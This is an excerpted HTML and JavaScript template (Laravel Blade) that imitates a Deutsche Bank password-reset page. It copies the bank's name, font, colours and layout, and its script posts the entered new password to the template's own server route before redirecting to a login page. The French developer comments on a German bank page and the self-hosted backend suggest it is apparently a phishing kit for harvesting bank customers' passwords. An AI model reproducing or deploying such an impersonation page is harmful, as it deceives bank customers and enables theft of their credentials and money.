...
<title>Deutsche Bank – Passwort zurücksetzen</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
:root{
  --blue:#0066b2; --blue-dk:#00519e; --navy:#1a2c6b;
  --red:#cc0000; --grey:#e8e8e8; --grey-t:#767676;
  --text:#202020; --white:#fff; --link:#0066b2; --green:#1a8a3a;
  --sidebar-w:375px;
}
html,body{ min-height:100%; font-family:"DeutscheBank UI",Helvetica,sans-serif; font-size:25px; color:var(--text); }
body{
...
.left-col{ flex:1; min-height:100vh; display:flex; align-items:center; padding-left:18%; }
.card{ background:var(--white); width:560px; padding:46px 54px 50px; animation:fadeUp .38s ease both; }
...
.logo-sq{ width:24px; height:24px; flex-shrink:0; border:2px solid var(--blue); background:var(--white); display:flex; align-items:center; justify-content:center; }
...
.inp{
  height:40px; border:1px solid #aaa; padding:0 9px; font-size:14.5px;
  color:var(--text); background:var(--white); outline:none; border-radius:0;
...
.alert-error{ display:none; background:#fff0f0; border-left:3px solid var(--red); color:var(--red); font-size:13px; padding:10px 12px; margin-bottom:16px; line-height:1.4; }
.alert-error.visible{ display:block; animation:fadeUp .25s ease; }

/* Force indicateur */
.strength-bar{ height:4px; border-radius:2px; margin-top:6px; background:#e8e8e8; overflow:hidden; }
.strength-fill{ height:100%; width:0; transition:width .3s, background .3s; border-radius:2px; }
.strength-label{ font-size:11px; color:var(--grey-t); margin-top:4px; }

/* Succès */
.success-screen{ display:none; flex-direction:column; align-items:center; text-align:center; padding:16px 0 8px; animation:fadeUp .35s ease both; }
.success-screen.visible{ display:flex; }
.success-icon{ width:64px; height:64px; background:#f0fff4; border-radius:50%; border:2px solid #b0e0c0; display:flex; align-items:center; justify-content:center; margin-bottom:20px; }
.success-title{ font-size:22px; font-weight:700; color:var(--green); margin-bottom:12px; }
.success-msg{ font-size:14px; color:var(--text); line-height:1.6; }

.divider{ border:none; border-top:1px solid #e8e8e8; margin:24px 0 20px; }
.card-btm{ display:flex; align-items:center; justify-content:space-between; margin-top:4px; }
.back-link{ color:var(--link); font-size:13.5px; text-decoration:underline; background:none; border:none; cursor:pointer; padding:0; font-family:inherit; }
.back-link:hover{ color:var(--blue-dk); }
.btn-action{
  background:var(--blue); color:#fff; border:none;
  height:42px; padding:0 28px; font-size:15px; font-weight:400;
  font-family:inherit; cursor:pointer; border-radius:0; min-width:160px;
...
.btn-action .spinner{ display:none; width:16px; height:16px; border:2px solid rgba(255,255,255,.35); border-top-color:#fff; border-radius:50%; animation:spin .7s linear infinite; position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); }
.btn-action.loading .btn-label{ opacity:0; }
.btn-action.loading .spinner{ display:block; }

/* Sidebar */
.sidebar{ width:var(--sidebar-w); flex-shrink:0; background:var(--white); display:flex; flex-direction:column; min-height:100vh; margin-right:250px; }
.promo-img{ width:100%; height:182px; padding:5%; background-size:auto; position:relative; overflow:hidden; flex-shrink:0; }
.ph-big{ position:absolute; right:80px; top:50%; transform:translateY(-50%); width:66px; height:112px; background:linear-gradient(170deg,#3a3a58,#22223a); border-radius:10px; border:1.5px solid rgba(255,255,255,.2); box-shadow:-7px 5px 20px rgba(0,0,0,.5); }
.ph-big-scr{ position:absolute; inset:5px; background:linear-gradient(145deg,#0e5caa,#07305c); border-radius:6px; overflow:hidden; display:flex; align-items:flex-end; justify-content:flex-end; padding:5px; }
...
.ph-sm{ position:absolute; right:30px; bottom:14px; width:48px; height:78px; background:linear-gradient(170deg,#484860,#2e2e48); border-radius:8px; border:1.5px solid rgba(255,255,255,.15); box-shadow:4px 4px 16px rgba(0,0,0,.4); }
...
.promo-badge{ position:absolute; top:18px; right:74px; width:40px; height:40px; background:#14142a; border-radius:50%; border:2px solid rgba(255,255,255,.22); display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; font-size:7.5px; font-weight:700; text-align:center; line-height:1.3; }
  ...
  <div class="layout">
    ...
    <div class="left-col">
      <div class="card">
        ...
        <div id="formWrap">
          <h1 class="card-title">Neues Passwort</h1>
          <p class="card-sub">
          ...
          <div class="card-btm">
            <a class="back-link" href="{{ route('forgot') }}">
              ← Zurück
            </a>
            <button class="btn-action" type="button" id="resetBtn">
              <span class="btn-label">Passwort speichern</span>
        ...
        <div class="success-screen" id="successScreen">
          ...
          <p class="success-title">Passwort aktualisiert!</p>
          <p class="success-msg">
...
(function () {
  ...
  var btnLabel        = resetBtn.querySelector('.btn-label');
  ...
  password.addEventListener('input', function () {
    ...
    var colors = ['#e0e0e0','#e3001b','#ff8800','#f5c800','#1a8a3a'];
    var labels = ['','Sehr schwach','Schwach','Mittel','Stark'];
    var pct    = [0, 20, 40, 70, 100];
  ...
  [password, passwordConfirm].forEach(function (el) {
  ...
  resetBtn.addEventListener('click', function () {
    ...
    var conf = passwordConfirm.value;
    ...
    fetch('{{ route("password.reset.store") }}', {
      method: 'POST',
      headers: {
    ...
    .then(function (data) {
      ...
      if (data.success) {
        ...
        /* Redirection vers login après 2.5s */
        setTimeout(function () {
